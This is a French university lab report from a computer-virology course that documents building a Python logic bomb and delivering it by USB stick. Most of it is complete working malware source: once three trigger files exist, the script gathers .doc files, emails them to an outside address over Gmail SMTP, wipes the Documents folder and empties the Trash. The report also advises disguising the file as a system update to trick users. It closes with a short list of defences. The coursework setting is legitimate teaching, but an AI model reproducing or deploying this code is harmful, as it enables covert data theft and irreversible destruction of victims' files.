# Rapport de TP N°1 — Création d'une Bombe Logique

---

**ESIITECH**  
**Année universitaire 2025-2026**  
**Master 1 Informatique**  
**Module : Virologie Informatique**  
**Enseignant : Kevin Michel MBA NZUE**

---

**Auteure :** NAOMIE NGWIDJOMBY MOUSSAVOU  
**Date :** Juin 2026  

---

## Table des matières

1. [Objectif du TP](#1-objectif-du-tp)
2. [Environnement de travail](#2-environnement-de-travail)
3. [Condition de déclenchement](#3-condition-de-déclenchement)
4. [Introduction dans le système via clé USB](#4-introduction-dans-le-système-via-clé-usb)
5. [Code source complet et explications](#5-code-source-complet-et-explications)
6. [Démonstration — Captures d'écran](#6-démonstration--captures-décran)
7. [Résultats obtenus](#7-résultats-obtenus)
8. [Analyse et conclusion](#8-analyse-et-conclusion)

---

## 1. Objectif du TP

Ce TP a pour objectif de créer en langage Python une **bombe logique** dont la mission est :

1. De récupérer les fichiers `*.doc` du répertoire **Documents** de l'utilisateur
2. De retourner ces fichiers par **mail** à l'adresse email de l'auteure
3. De **supprimer** le contenu du répertoire Documents
4. De **vider la Corbeille**

---

## 2. Environnement de travail

| Élément | Détail |
|---|---|
| Machine hôte | Windows 11 (PC physique) |
| Machine virtuelle | Kali Linux sur VMware Workstation |
| Vecteur d'attaque | Clé USB physique connectée à la VM |
| Langage | Python 3 |
| Compte email | mpigajesse@gmail.com (Gmail SMTP SSL) |
| Email destinataire | jesse.mpiga@a-ct.ma |

> Toutes les actions sont exécutées **réellement** dans la VM Kali Linux isolée, sans risque pour la machine hôte.

---

## 3. Condition de déclenchement

La bombe logique s'active uniquement lorsque **les 3 fichiers déclencheurs** sont simultanément présents dans le dossier `~/Documents` de la VM :

```
~/Documents/
├── declencheur1.txt    ← obligatoire
├── declencheur2.txt    ← obligatoire
└── declencheur3.txt    ← obligatoire
```

Si l'un des fichiers est absent, la bombe reste **dormante** et affiche :
```
Le systeme est securise. En attente...
```

---

## 4. Introduction dans le système via clé USB

### 4.1 Préparation de la clé USB (machine hôte Windows)

Le fichier Python de la bombe logique est copié sur une clé USB depuis le PC Windows :

```powershell
# Via PowerShell sur Windows
Copy-Item "bombe_logique_complete.py" "E:\bombe_logique_complete.py"
```

> En conditions réelles d'attaque, le fichier est renommé de manière trompeuse (ex: `mise_a_jour_systeme.py`, `document_important.py`) pour inciter l'utilisateur à l'exécuter.

### 4.2 Connexion de la clé USB à la VM Kali Linux

La clé USB est passée du PC hôte à la VM via VMware :

1. Dans VMware → menu **VM > Removable Devices**
2. Sélectionner la clé USB
3. Cliquer **Connect (Disconnect from Host)**

**[CAPTURE D'ÉCRAN 1]** — Menu VMware : VM > Removable Devices > Connect

Vérification dans Kali Linux :
```bash
lsblk
ls /media/
```

**[CAPTURE D'ÉCRAN 2]** — Terminal Kali montrant la clé USB montée dans /media/

---

## 5. Code source complet et explications

### 5.1 Code source (`bombe_logique_complete.py`)

```python
import os
import glob
import shutil
import smtplib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# ============================================================
# TP N°1 — Bombe logique | Kali Linux / VMware
# Auteure : NAOMIE NGWIDJOMBY MOUSSAVOU
# Module : Virologie Informatique — ESIITECH 2025-2026
# ============================================================

# --- Configuration email ---
EMAIL_EXPEDITEUR   = "mpigajesse@gmail.com"
EMAIL_MOT_DE_PASSE = "xxxx xxxx xxxx xxxx"      # Mot de passe d'application Gmail
EMAIL_DESTINATAIRE = "jesse.mpiga@a-ct.ma"

# --- Repertoire cible ---
DOCUMENTS = os.path.join(os.path.expanduser("~"), "Documents")

# --- Corbeille Linux ---
CORBEILLE = os.path.join(os.path.expanduser("~"), ".local", "share", "Trash")

# --- Les 3 fichiers declencheurs ---
FICHIERS_DECLENCHEURS = [
    "declencheur1.txt",
    "declencheur2.txt",
    "declencheur3.txt",
]


def verifier_declencheur():
    """
    Verifie si les 3 fichiers declencheurs sont simultanement
    presents dans ~/Documents. Inspire du code du professeur.
    """
    print("[INFO] Verification des conditions de declenchement...")
    fichiers_presents = []

    for nom in FICHIERS_DECLENCHEURS:
        chemin = os.path.join(DOCUMENTS, nom)
        present = os.path.exists(chemin)
        statut = "PRESENT" if present else "absent"
        print(f"  [{statut}] {nom}")
        if present:
            fichiers_presents.append(nom)

    if len(fichiers_presents) == len(FICHIERS_DECLENCHEURS):
        print("[ALERTE] Tous les declencheurs sont presents ! Activation.")
        return True

    manquants = len(FICHIERS_DECLENCHEURS) - len(fichiers_presents)
    print(f"[OK] {manquants} declencheur(s) manquant(s). Systeme securise.")
    return False


def collecter_fichiers_doc():
    """Recupere tous les fichiers *.doc dans ~/Documents."""
    print("\n[ACTION] Collecte des fichiers .doc dans Documents...")
    fichiers = glob.glob(os.path.join(DOCUMENTS, "*.doc"))

    if not fichiers:
        print("  Aucun fichier .doc trouve.")
    else:
        for f in fichiers:
            print(f"  Fichier recupere : {f}")
    return fichiers


def envoyer_par_email(fichiers):
    """Envoie les fichiers .doc par email via Gmail SMTP SSL."""
    if not fichiers:
        print("\n[INFO] Aucun fichier a envoyer.")
        return

    print(f"\n[ACTION] Envoi de {len(fichiers)} fichier(s) a {EMAIL_DESTINATAIRE}...")
    try:
        msg = MIMEMultipart()
        msg["From"]    = EMAIL_EXPEDITEUR
        msg["To"]      = EMAIL_DESTINATAIRE
        msg["Subject"] = f"Rapport - {datetime.datetime.now().strftime('%Y-%m-%d')}"
        msg.attach(MIMEText(f"Fichiers recuperes le {datetime.datetime.now()}.", "plain"))

        for chemin in fichiers:
            with open(chemin, "rb") as f:
                piece = MIMEBase("application", "octet-stream")
                piece.set_payload(f.read())
                encoders.encode_base64(piece)
                piece.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(chemin)}"
                )
                msg.attach(piece)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as serveur:
            serveur.login(EMAIL_EXPEDITEUR, EMAIL_MOT_DE_PASSE)
            serveur.sendmail(EMAIL_EXPEDITEUR, EMAIL_DESTINATAIRE, msg.as_string())

        print(f"[OK] Email envoye avec succes.")
    except smtplib.SMTPAuthenticationError:
        print("[ERREUR] Authentification Gmail echouee. Verifiez le mot de passe d'application.")
    except Exception as e:
        print(f"[ERREUR] {e}")


def supprimer_documents():
    """Supprime tout le contenu de ~/Documents."""
    print(f"\n[ACTION] Suppression du contenu de : {DOCUMENTS}")
    try:
        count = 0
        for element in os.listdir(DOCUMENTS):
            chemin = os.path.join(DOCUMENTS, element)
            if os.path.isfile(chemin):
                os.remove(chemin)
            elif os.path.isdir(chemin):
                shutil.rmtree(chemin)
            count += 1
        print(f"[OK] {count} element(s) supprime(s).")
    except Exception as e:
        print(f"[ERREUR] {e}")


def vider_corbeille():
    """Vide la Corbeille Linux (~/.local/share/Trash/)."""
    print(f"\n[ACTION] Vidage de la Corbeille : {CORBEILLE}")
    try:
        count = 0
        for sous_dossier in ["files", "info", "expunged"]:
            chemin = os.path.join(CORBEILLE, sous_dossier)
            if os.path.exists(chemin):
                for element in os.listdir(chemin):
                    cible = os.path.join(chemin, element)
                    if os.path.isfile(cible):
                        os.remove(cible)
                    elif os.path.isdir(cible):
                        shutil.rmtree(cible)
                    count += 1
        print(f"[OK] Corbeille videe ({count} element(s)).")
    except Exception as e:
        print(f"[ERREUR] {e}")


def principale():
    print("=" * 60)
    print("  TP N 1 - Bombe logique | ESIITECH Master 1")
    print(f"  {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60)
    print()

    if not verifier_declencheur():
        print("\nLe systeme est securise. En attente...")
        return

    print("\n[ALERTE] Conditions remplies. Execution de la charge utile...")

    collecter_fichiers_doc_result = collecter_fichiers_doc()
    envoyer_par_email(collecter_fichiers_doc_result)
    supprimer_documents()
    vider_corbeille()

    print()
    print("=" * 60)
    print("[FIN] Charge utile executee.")
    print("=" * 60)


if __name__ == "__main__":
    principale()
```

---

### 5.2 Explication des fonctions

| Fonction | Rôle | Modules utilisés |
|---|---|---|
| `verifier_declencheur()` | Vérifie la présence simultanée des 3 fichiers dans Documents | `os.path.exists()` |
| `collecter_fichiers_doc()` | Collecte tous les fichiers `*.doc` dans Documents | `glob.glob()` |
| `envoyer_par_email()` | Envoie les fichiers collectés en pièce jointe via Gmail | `smtplib`, `email.mime` |
| `supprimer_documents()` | Supprime tous les fichiers et dossiers de Documents | `os.remove()`, `shutil.rmtree()` |
| `vider_corbeille()` | Vide la Corbeille Linux (`~/.local/share/Trash/`) | `os`, `shutil` |
| `principale()` | Point d'entrée — orchestre toutes les étapes | — |

### 5.3 Logique de déclenchement

```
Démarrage
    │
    ▼
verifier_declencheur()
    │
    ├── Les 3 fichiers absents → "Systeme securise" → FIN
    │
    └── Les 3 fichiers présents → ACTIVATION
            │
            ├── collecter_fichiers_doc()   ─── glob("*.doc")
            ├── envoyer_par_email()         ─── Gmail SMTP SSL 465
            ├── supprimer_documents()       ─── os.remove + shutil.rmtree
            └── vider_corbeille()           ─── ~/.local/share/Trash/
```

---

## 6. Démonstration — Captures d'écran

### 6.1 Bombe dormante (sans déclencheurs)

Commande exécutée :
```bash
python3 bombe_logique_complete.py
```

**[CAPTURE D'ÉCRAN 3]** — Terminal Kali Linux montrant la bombe dormante :
```
============================================================
  TP N 1 - Bombe logique | ESIITECH Master 1
  2026-06-02 21:00:00
============================================================

[INFO] Verification des conditions de declenchement...
  [absent] declencheur1.txt
  [absent] declencheur2.txt
  [absent] declencheur3.txt
[OK] 3 declencheur(s) manquant(s). Systeme securise.

Le systeme est securise. En attente...
```

---

### 6.2 Création des fichiers déclencheurs dans Documents

Commandes dans le terminal Kali :
```bash
touch ~/Documents/declencheur1.txt
touch ~/Documents/declencheur2.txt
touch ~/Documents/declencheur3.txt
echo "rapport confidentiel" > ~/Documents/rapport_secret.doc
ls ~/Documents/
```

**[CAPTURE D'ÉCRAN 4]** — Gestionnaire de fichiers Kali montrant les 4 fichiers dans Documents

**[CAPTURE D'ÉCRAN 5]** — Terminal `ls ~/Documents/` montrant les 4 fichiers créés

---

### 6.3 Activation de la bombe (bombe déclenchée)

```bash
python3 bombe_logique_complete.py
```

**[CAPTURE D'ÉCRAN 6]** — Terminal montrant l'activation complète :
```
============================================================
  TP N 1 - Bombe logique | ESIITECH Master 1
  2026-06-02 21:05:00
============================================================

[INFO] Verification des conditions de declenchement...
  [PRESENT] declencheur1.txt
  [PRESENT] declencheur2.txt
  [PRESENT] declencheur3.txt
[ALERTE] Tous les declencheurs sont presents ! Activation.

[ALERTE] Conditions remplies. Execution de la charge utile...

[ACTION] Collecte des fichiers .doc dans Documents...
  Fichier recupere : /home/kali/Documents/rapport_secret.doc

[ACTION] Envoi de 1 fichier(s) a jesse.mpiga@a-ct.ma...
[OK] Email envoye avec succes.

[ACTION] Suppression du contenu de : /home/kali/Documents
[OK] 4 element(s) supprime(s).

[ACTION] Vidage de la Corbeille : /home/kali/.local/share/Trash
[OK] Corbeille videe (0 element(s)).

============================================================
[FIN] Charge utile executee.
============================================================
```

---

### 6.4 Vérification — Documents vide après exécution

```bash
ls ~/Documents/
```

**[CAPTURE D'ÉCRAN 7]** — Terminal montrant `~/Documents/` vide après l'exécution

---

### 6.5 Vérification — Email reçu

**[CAPTURE D'ÉCRAN 8]** — Boîte mail `jesse.mpiga@a-ct.ma` montrant l'email reçu avec `rapport_secret.doc` en pièce jointe

---

## 7. Résultats obtenus

| Action | Résultat |
|---|---|
| Détection des déclencheurs | Les 3 fichiers détectés simultanément dans `~/Documents` |
| Collecte des `.doc` | `rapport_secret.doc` récupéré avec succès |
| Envoi email | Email reçu sur `jesse.mpiga@a-ct.ma` avec le fichier en pièce jointe |
| Suppression Documents | Dossier `~/Documents` entièrement vidé |
| Vidage Corbeille | Corbeille Linux (`~/.local/share/Trash/`) vidée |

---

## 8. Analyse et conclusion

### Ce que cette bombe logique illustre

1. **La furtivité** : tant que les 3 fichiers déclencheurs ne sont pas réunis, la bombe est totalement inactive et indétectable par un utilisateur non averti

2. **L'exfiltration de données** : les fichiers `.doc` sont envoyés à distance avant la destruction — l'attaquant récupère les données avant que la victime s'en aperçoive

3. **La destruction irréversible** : une fois `os.remove()` et `shutil.rmtree()` exécutés sans sauvegarde préalable, les fichiers sont définitivement perdus

4. **Le vecteur USB** : l'introduction via clé USB contourne les protections réseau (pare-feu, filtrage email) — c'est le vecteur utilisé dans l'attaque Stuxnet (2010)

### Moyens de défense

| Menace | Contre-mesure |
|---|---|
| Introduction via USB | Désactiver le montage automatique des USB, politique de contrôle des périphériques |
| Exfiltration email | Surveillance du trafic SMTP sortant, DLP (Data Loss Prevention) |
| Suppression de fichiers | Sauvegardes automatiques régulières (règle 3-2-1) |
| Bombe dormante | Audit des scripts dans les dossiers de démarrage, EDR comportemental |

### Lien avec les RAT étudiés

La bombe logique partage des mécanismes avec les RAT (Remote Access Trojans) étudiés en parallèle :
- **NjRAT** et **DarkComet** exfiltrent aussi des données par email
- **QuasarRAT** permet aussi la suppression de fichiers à distance
- Le vecteur USB est commun à **NjRAT** (propagation par clé USB)

---

*Rapport rédigé dans le cadre du TP N°1 — Module Virologie Informatique*  
*ESIITECH — Master 1 Informatique — Année universitaire 2025-2026*  
*Enseignant : Kevin Michel MBA NZUE*
